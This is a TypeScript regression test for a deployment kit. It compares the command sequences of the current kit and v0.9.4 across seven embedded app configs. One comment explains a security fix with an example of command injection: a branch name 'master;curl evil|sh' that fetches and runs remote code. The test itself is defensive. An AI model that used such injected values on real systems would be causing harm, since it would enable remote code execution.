// Regression guard for the 7 real fleet consumers (BEWK/CAIRN/CLIPD/MIZEN/SANO/
// SAVORO/SMARTHOME). Loads each app's REAL .deploy-kit.config.json (embedded
// verbatim below — copied from the app repo at the time this test was written) and
// asserts the CURRENT kit emits the byte-identical command sequence that the
// actual v0.9.4 deploy.js/release.js emitted for that same config. `preRestartChecks`
// is absent from every one of these configs, so this is exactly the "strictly
// config-gated" claim: the new phase must be a config-invisible no-op for every
// existing consumer.
//
// The v0.9.4 source is loaded live from the git tag (not retyped/duplicated here)
// so this test can't silently drift from what v0.9.4 actually did.
import { describe, it, expect } from 'vitest';
import { createRequire } from 'module';
import { execSync } from 'child_process';
import path from 'path';
import Module from 'module';

const require = createRequire(__filename);
const REPO_ROOT = path.resolve(__dirname, '..', '..');
const kit = require('../index.js') as typeof import('../index');
const { loadConfig } = kit;

// Load a source file AS IT WAS AT TAG `tag`, wired to the CURRENT exec/lock/log
// modules, and to `overrides` for its other in-package requires (used to wire
// release.js's old deploy.js dependency, and deploy.js's old release.js
// dependency, so the pair is internally consistent).
//
// IMPORTANT, and corrected from an earlier version of this comment: exec.js and
// lock.js are NOT "unchanged since v0.9.4" — lock.js was substantially rewritten
// on this branch (state moved off /tmp, atomic takeover, owner/nonce metadata,
// `ensureStateDir`), and exec.js gained `shQuote`, ssh option validation, and the
// StrictHostKeyChecking/BatchMode hardening defaults. Because BOTH the v0.9.4
// pipeline (`oldDeploy`/`oldRelease`, loaded below) and the CURRENT kit are wired
// to these SAME current modules, any behavioral difference that originates
// *inside* exec.js/lock.js themselves is invisible to this comparison — it
// shows up identically on both sides and never surfaces as a mismatch. That
// lock/state rewrite is covered separately, against a real shell, by
// `lock.test.ts`; the ssh-hardening-argument changes are covered by the
// "ssh hardening" suite in `deploy-kit.test.ts`. What THIS file actually
// verifies is narrower and complementary: that deploy.js's/release.js's own
// pipeline logic (step order, gating, which commands get built and when) is
// byte-identical to v0.9.4 except for the three documented `applyPkg82Deltas`
// deltas below. Only log.js is genuinely unchanged since v0.9.4 (verified:
// `git diff v0.9.4 HEAD -- src/log.js` is empty).
function loadAtTag(relFile: string, tag: string, overrides: Record<string, unknown> = {}) {
  const source = execSync(`git show ${tag}:src/${relFile}`, { cwd: REPO_ROOT, encoding: 'utf8' });
  const filename = path.join(REPO_ROOT, 'src', relFile);
  const m = new Module(filename, module);
  m.filename = filename;
  (m as any).paths = (Module as any)._nodeModulePaths(path.dirname(filename));
  const nodeRequire = m.require.bind(m);
  (m as any).require = (id: string) => (id in overrides ? overrides[id] : nodeRequire(id));
  (m as any)._compile(source, filename);
  return m.exports;
}

const exec = require('../exec.js');
const lock = require('../lock.js');
const log = require('../log.js');

const TAG = 'v0.9.4';
const oldRelease = loadAtTag('release.js', TAG, { './exec': exec, './lock': lock, './log': log });
const oldDeploy = loadAtTag('deploy.js', TAG, {
  './exec': exec, './lock': lock, './log': log, './release': oldRelease,
});
// v0.9.4's release.js resolves the peer deploy.js via `require('./deploy')` only
// indirectly (it doesn't) — release.js has no back-reference to deploy.js, so no
// further wiring is needed here.

const SHA = 'a1b2c3d4e5f60718293a4b5c6d7e8f9012345678';

// One universal fake execFileSync good enough to drive EITHER the legacy or the
// release pipeline for any of the 7 real configs without throwing on an
// unrecognized command (falls back to '' — this test cares about the COMMAND
// SEQUENCE the kit emits, not deep correctness of a specific hook's output).
function makeUniversalRuntime(appNames: string[]) {
  const calls: string[] = [];
  const stopped = new Set<string>();
  const execFileSync = (_file: string, args: string[]) => {
    const cmd = args[args.length - 1];
    calls.push(cmd);
    if (/pm2 stop /.test(cmd)) { appNames.forEach((n) => stopped.add(n)); return ''; }
    if (/pm2 (startOrRestart|start|restart)/.test(cmd)) { stopped.clear(); return ''; }
    if (cmd.includes('.deploy-kit-layout')) return '{"layout":"releases","version":1}';
    if (cmd.includes('cat') && cmd.includes('deploy-kit-state.json')) return '';
    if (cmd.includes('mv --version')) return 'mv (GNU coreutils) 9.1';
    if (cmd.includes('df -kP') || cmd.includes('df -Pk')) return '99999999';
    if (cmd.includes('date -u')) return '20260710T090000Z';
    if (cmd.includes('rev-parse HEAD')) return SHA;
    if (cmd.includes('rev-parse')) return SHA;
    if (cmd.includes('readlink -f')) return '/canonical';
    if (cmd.includes('pm2 jlist')) {
      // Reflect the `stopped` set: release.js's `stopWritersConfirmed`/
      // `verifyActivation` actually READ this back (not just fire-and-forget
      // pm2 stop/restart), so a fake that always reports "online" makes the
      // release pipeline's own stop-confirmation permanently fail closed —
      // aborting every dbBoundApps release config identically (old and new)
      // before ever reaching flip/restart, which would silently make THIS
      // fixture vacuous all over again, just one phase later.
      return JSON.stringify(appNames.map((n) => ({
        name: n, pid: 111, pm2_env: { status: stopped.has(n) ? 'stopped' : 'online', restart_time: 5 },
      })));
    }
    // Release ids must match RELEASE_ID_BODY (`[0-9a-f]{7,40}-<UTC timestamp>`) —
    // hex only. An earlier version of this fixture used "prev1234567"/
    // "prev0000000", which are NOT valid hex (the letters p/r/v aren't hex
    // digits), so `assertSafeTarget` threw during preflight for EVERY
    // release-layout consumer (cairn/mizen/smarthome) in BOTH the old and new
    // pipeline, making `expect(newRun.error).toEqual(oldRun.error)` pass on two
    // identical early aborts without ever exercising fetch/resolveSha/
    // materialize/flip. Valid hex ids so the release pipeline actually runs.
    if (cmd.includes('readlink ') && cmd.includes('/current')) return 'releases/deadbee-20260709T090000Z';
    if (cmd.includes('readlink ') && cmd.includes('/previous')) return 'releases/cafe123-20260708T090000Z';
    if (cmd.includes('ls -1')) return 'deadbee-20260709T090000Z\ncafe123-20260708T090000Z';
    if (cmd.includes('git ls-files')) return '';
    if (cmd.includes('curl')) return '200';
    if (/backup/i.test(cmd)) return '/var/lib/app/backups/backup-1.gpg'; // safe backupId shape
    return '';
  };
  return { execFileSync, calls };
}

const ctx = (runtime: unknown) => ({ runtime, sleep: () => {} });

// PKG-82 deliberately changed deploy behavior (legacy and/or release layout) in
// four ways. This function encodes exactly those four deltas, narrowly and
// anchored, so they can be applied to the v0.9.4 sequence and diffed against the
// CURRENT kit's output. Anything the current kit does that ISN'T one of these
// four deltas will still show up as a mismatch — that's the whole point of
// keeping the v0.9.4 anchor instead of just re-snapshotting today's output.
function applyPkg82Deltas(oldSeq: string[], config: unknown): string[] {
  // Delta 1 (security): the remote/branch used to be interpolated unquoted into a
  // remote shell command (`git fetch origin --prune`, `git pull --ff-only origin
  // master`). The branch is derived from the target's own `origin/HEAD`, so a
  // branch named e.g. `master;curl evil|sh` would execute on the target. PKG-82
  // shell-quotes both tokens. Anchored to the exact literal `git fetch`/`git pull
  // --ff-only` command shapes emitted by this kit — it will not touch any other
  // command in the sequence.
  let seq = oldSeq.map((cmd) => {
    let next = cmd.replace(/git fetch (\S+) --prune\b/, "git fetch '$1' --prune");
    next = next.replace(/git pull --ff-only (\S+) (\S+)\b/, "git pull --ff-only '$1' '$2'");
    return next;
  });

  // Delta 2 (data integrity, LEGACY layout only): the pre-migration DB backup
  // used to run BEFORE DB-bound apps were paused; a backup taken with writers
  // still live can be inconsistent. PKG-82 moves the backup to run AFTER the
  // pause step, matching what the release layout already did (release.js's own
  // "stop writers -> backup -> migrate" ordering is unchanged since v0.9.4 — see
  // the module header comment). In v0.9.4's LEGACY sequence the backup command
  // is always the single line immediately preceding the `pm2 stop ...` pause
  // line (when dbBoundApps is non-empty); PKG-82 swaps just that one adjacent
  // pair. Configs with no dbBoundApps (e.g. clipd) have no pause line at all, so
  // this is a no-op for them. Scoped to `layout.type !== 'releases'`: the
  // release-layout configs (cairn/mizen/smarthome) ALSO emit a `pm2 stop ...`
  // line (release.js's own pre-existing, unrelated writer-stop step), and a
  // blind index-based swap there would corrupt an already-correct sequence
  // that this delta was never meant to touch.
  const isReleaseLayout = !!(config as { layout?: { type?: string } } | null)?.layout
    && (config as { layout?: { type?: string } }).layout?.type === 'releases';
  if (!isReleaseLayout) {
    const pauseIndex = seq.findIndex((cmd) => /pm2 stop \S/.test(cmd));
    if (pauseIndex > 0) {
      const swapped = [...seq];
      [swapped[pauseIndex - 1], swapped[pauseIndex]] = [swapped[pauseIndex], swapped[pauseIndex - 1]];
      seq = swapped;
    }
  }

  // Delta 3 (correctness regression fix): $HOME/.deploy-kit used to be created
  // ONLY as a side effect of acquireLock, so a --no-lock / lock:false deploy
  // silently never recorded its rollback pointer (the OLD /tmp path always
  // existed, so this was invisible before state moved off /tmp, which does
  // NOT always exist). PKG-82 runs `ensureStateDir` as its own fragment
  // immediately before the "Recording current revision" `git rev-parse HEAD >
  // ...prev-sha` redirect, so recording works regardless of the lock setting —
  // state must exist independent of locking. Anchored to the exact literal
  // "git rev-parse HEAD > <prevShaFile> 2>/dev/null || true" line this kit
  // emits for THIS config (via the CURRENT, real `lock.ensureStateDir`/
  // `lock.prevShaFile` — not retyped/duplicated here, so this can't drift the
  // next time that fragment changes) — it will not touch any other command.
  // The v0.9.4 line is always wrapped with a "cd <projectDir> && " (ssh/local
  // target-command) prefix, so match on the literal SUFFIX rather than the
  // whole string, and preserve whatever prefix this consumer's mode/host
  // produced.
  const prevShaLine = `git rev-parse HEAD > ${lock.prevShaFile(config)} 2>/dev/null || true`;
  seq = seq.map((cmd) => {
    if (!cmd.endsWith(prevShaLine)) return cmd;
    const prefix = cmd.slice(0, cmd.length - prevShaLine.length);
    return `${prefix}${lock.ensureStateDir(config)}\n${prevShaLine}`;
  });

  // Delta 4 (security, release layout): the SAME defense-in-depth quoting as
  // Delta 1, but for the release layout's OWN git plumbing — deploy.js's git
  // fetch/pull and release.js's git fetch/rev-parse against the bare repo.git
  // mirror are two separate call sites (see the module header comment above),
  // so this branch's quoting fix shows up here too, independently of Delta 1.
  // Anchored to the exact literal `fetch --prune <remote> '+refs/heads/...'`
  // and `rev-parse refs/heads/<branch>` / `rev-parse <remote>/<branch>` shapes
  // release.js emits — matched and replaced one at a time (not via alternation
  // on an already-substituted string) so quoting one shape can never corrupt
  // the other.
  seq = seq.map((cmd) => {
    let next = cmd.replace(/fetch --prune (\S+) '\+refs\/heads/, "fetch --prune '$1' '+refs/heads");
    if (next === cmd) {
      const refsHeadsMatch = next.match(/rev-parse refs\/heads\/(\S+)$/);
      if (refsHeadsMatch) {
        next = next.replace(/rev-parse refs\/heads\/(\S+)$/, "rev-parse refs/heads/'$1'");
      } else {
        next = next.replace(/rev-parse (\S+)\/(\S+)$/, "rev-parse '$1'/'$2'");
      }
    }
    return next;
  });

  return seq;
}

// --- The 7 real consumer configs, embedded verbatim. ---
const CONFIGS: Record<string, unknown> = {
  bewks: {
    host: 'bewks@100.92.155.27', projectDir: '/srv/bewks', mode: 'ssh', branch: 'master',
    appNames: ['bewks-app'], dbBoundApps: ['bewks-app', 'bewks-goodreads-worker'],
    ensureApps: ['bewks-goodreads-worker', 'bewks-tunnel'], ecosystemFile: 'ecosystem.config.js',
    tunnelName: 'bewks-tunnel', port: 3000, healthPath: '/api/health',
    hooks: {
      install: 'npm ci || npm install', backup: 'npm run db:backup:prod',
      migrate: 'npm run db:migrate:prod && npm run smoke:user:prod:if-configured && npm run smoke:user:prod:admin:if-configured && npm run ensure:owner:if-configured',
      build: 'rm -rf .next/types && NODE_ENV=production BEWKS_ENV=prod npm run build',
    },
  },
  cairn: {
    host: 'cairn@bigpi', projectDir: '/srv/cairn', mode: 'ssh', branch: 'master',
    appNames: ['cairn-app'], dbBoundApps: ['cairn-app'], tunnelName: 'cairn-tunnel',
    ecosystemFile: 'shared/ecosystem.config.cjs', port: 3004, healthPath: '/api/health',
    layout: {
      type: 'releases', keepReleases: 4,
      sharedPaths: ['.env', 'packages/api/prisma/data', 'uploads'],
      releaseChecks: [{ name: 'prisma-client-loads', command: "node -e \"require('@prisma/client')\"" }],
      runningShaCommand: "curl -sf http://localhost:3004/api/health | node -e \"let d='';process.stdin.on('data',c=>d+=c).on('end',()=>console.log(JSON.parse(d).deployment?.releaseId||''))\"",
    },
    postDeployChecks: [{
      name: 'production-board-smoke',
      command: 'cd current && set -a && . ./.env && set +a && E2E_PRODUCTION_SMOKE=1 E2E_BASE_URL=https://cairn.andrewvpopov.com npx playwright test --config packages/web-app/playwright.config.ts packages/web-app/e2e/production-board-smoke.spec.ts',
    }],
    deliveryEvent: { command: 'cd current && set -a && . ./.env && set +a && node scripts/emit-cairn-deployment-event.js' },
    hooks: {
      install: 'npm ci || npm install || exit 1; npx playwright install chromium',
      backup: 'bash scripts/backup-deploy.sh',
      migrate: 'DATABASE_URL="file:/srv/cairn/shared/data/cairn.db" npx prisma migrate deploy --schema packages/api/prisma/schema.prisma && chmod 600 /srv/cairn/shared/data/cairn.db /srv/cairn/shared/data/cairn.db-wal /srv/cairn/shared/data/cairn.db-shm 2>/dev/null || true',
      build: 'npm run build', restore: 'bash scripts/restore-deploy-backup.sh',
    },
  },
  clipd: {
    host: 'clipd@bigpi', projectDir: '/srv/clipd', mode: 'ssh', branch: 'main',
    appNames: ['clipd-api'], dbBoundApps: [], tunnelName: 'clipd-tunnel',
    ecosystemFile: 'ecosystem.config.cjs', port: 3004, healthPath: '/health',
    healthHeaders: { 'X-Forwarded-Proto': 'https' },
    hooks: { install: 'npm ci || npm install', build: 'npm run build' },
  },
  mizen: {
    host: 'mizen@bigpi', projectDir: '/srv/mizen', mode: 'ssh', branch: 'main',
    appNames: ['mizen-api', 'mizen-collaboration', 'mizen-worker'],
    dbBoundApps: ['mizen-api', 'mizen-collaboration', 'mizen-worker'],
    tunnelName: 'mizen-tunnel', ensureApps: ['mizen-tunnel'], ecosystemFile: 'ecosystem.config.cjs',
    port: 3012, healthPath: '/health/ready', stepTimeoutSeconds: 900,
    preDeployChecks: [{ name: 'disk', command: "test \"$(df -Pk /srv/mizen | awk 'NR==2{print $4}')\" -ge 1048576" }],
    hooks: {
      install: 'pnpm install --frozen-lockfile --prefer-offline', backup: 'bash scripts/deploy-backup.sh',
      migrate: 'set -a; . ./.env.production; set +a; DATABASE_URL="$MIGRATION_DATABASE_URL" pnpm db:migrate',
      build: 'pnpm build', restore: 'bash current/scripts/deploy-restore.sh',
    },
    layout: {
      type: 'releases', keepReleases: 4, sharedPaths: ['.env', '.env.production'],
      releaseChecks: [
        { name: 'api-entrypoint', command: 'test -f apps/api/dist/main.js' },
        { name: 'web-build', command: 'test -f apps/web/dist/index.html' },
        { name: 'collaboration-entrypoint', command: 'test -f apps/collaboration/dist/main.js' },
        { name: 'worker-entrypoint', command: 'test -f apps/worker/dist/main.js' },
      ],
    },
  },
  'sano-os': {
    mode: 'local', projectDir: '/srv/sano-os', branch: 'main', appNames: ['sano-app'],
    dbBoundApps: ['sano-app'], tunnelName: 'sano-tunnel', ensureApps: ['sano-tunnel'],
    ecosystemFile: 'ecosystem.config.cjs', buildBeforeMigrate: true,
    preDeployChecks: [
      { name: 'disk', command: "test \"$(df -Pk /srv/sano-os | awk 'NR==2{print $4}')\" -ge 512000" },
      { name: 'e2e', command: 'pnpm e2e:ci' },
    ],
    port: 3003, healthPath: '/api/health/ready',
    hooks: {
      install: 'pnpm install --frozen-lockfile', backup: 'npm run backup',
      migrate: 'pnpm --filter @sano/api db:migrate', build: 'pnpm build',
    },
  },
  savoro: {
    host: 'savoro@bigpi', projectDir: '/srv/savoro', mode: 'ssh', branch: 'master',
    appNames: ['savoro-api', 'savoro-web'], dbBoundApps: ['savoro-api'],
    tunnelName: 'pantry-tunnel', ensureApps: ['pantry-tunnel'], ecosystemFile: 'ecosystem.config.js',
    port: 3001, healthPath: '/api/health', healthHeaders: { 'X-Forwarded-Proto': 'https' },
    buildBeforeMigrate: true,
    hooks: {
      install: 'npm ci || npm install', backup: 'npm run backup',
      migrate: 'npm run db:deploy && npm run db:verify-drift', build: 'npm run db:generate && npm run build',
    },
  },
  smarthome: {
    host: 'smarthome@100.92.155.27', projectDir: '/srv/smarthome', mode: 'ssh', branch: 'master',
    appNames: ['smarthome-api', 'smarthome-web'], dbBoundApps: ['smarthome-api'],
    tunnelName: 'smarthome-tunnel', port: 3002, healthPath: '/health',
    ecosystemFile: 'shared/ecosystem.config.cjs',
    layout: {
      type: 'releases', keepReleases: 4, sharedPaths: ['.env', 'packages/api/prisma/data'],
      releaseChecks: [{ name: 'prisma-client-loads', command: "node -e \"require('@prisma/client')\"" }],
      runningShaCommand: "curl -sf localhost:3002/health | node -e \"let d='';process.stdin.on('data',c=>d+=c).on('end',()=>console.log(JSON.parse(d).buildSha||''))\"",
    },
    hooks: {
      install: 'npm ci --include=dev || npm install', backup: 'bash scripts/backup-db.sh --local',
      migrate: 'DATABASE_URL="file:/srv/smarthome/shared/data/smarthome.db" npx prisma migrate deploy --schema packages/api/prisma/schema.prisma',
      build: 'npm run build', restore: 'bash scripts/restore-db.sh --deploy-hook',
    },
  },
};

function run(deployFn: Function, config: any, appNames: string[]) {
  const { execFileSync, calls } = makeUniversalRuntime(appNames);
  let error: any = null;
  let result: any = null;
  try {
    result = deployFn(config, {}, ctx({ execFileSync }));
  } catch (e) {
    error = e instanceof Error ? e.message : String(e);
  }
  return { calls, result, error };
}

describe('consumer regression: v0.9.4 command sequence is byte-identical (preRestartChecks absent)', () => {
  for (const [name, raw] of Object.entries(CONFIGS)) {
    it(`${name}: deploy() emits the same command sequence as v0.9.4`, () => {
      const fsImpl = { existsSync: () => true, readFileSync: () => JSON.stringify(raw) };
      const config = loadConfig({ cwd: `/${name}`, fsImpl });
      const appNames = (config as any).appNames as string[];

      const oldRun = run(oldDeploy.deploy, config, appNames);
      const newRun = run(kit.deploy, config, appNames);

      expect(newRun.calls).toEqual(applyPkg82Deltas(oldRun.calls, config));
      expect(newRun.error).toEqual(oldRun.error);

      // Guard against this test silently going vacuous again (the release-id
      // fixture bug fixed above, where an invalid-hex readlink/ls-1 fixture made
      // every release-layout consumer abort during preflight before the two
      // runs ever diverged, so `toEqual` above was comparing two identical
      // early aborts and would pass even if the release pipeline were badly
      // broken). Assert directly that a release-layout config's command stream
      // actually reaches the materialize step (`git worktree add`) — if this
      // ever stops being true, the comparison above has gone vacuous again.
      const layout = (config as { layout?: { type?: string } }).layout;
      if (layout && layout.type === 'releases') {
        expect(oldRun.calls.some((c) => c.includes('worktree add'))).toBe(true);
        expect(newRun.calls.some((c) => c.includes('worktree add'))).toBe(true);
      }
    });
  }
});
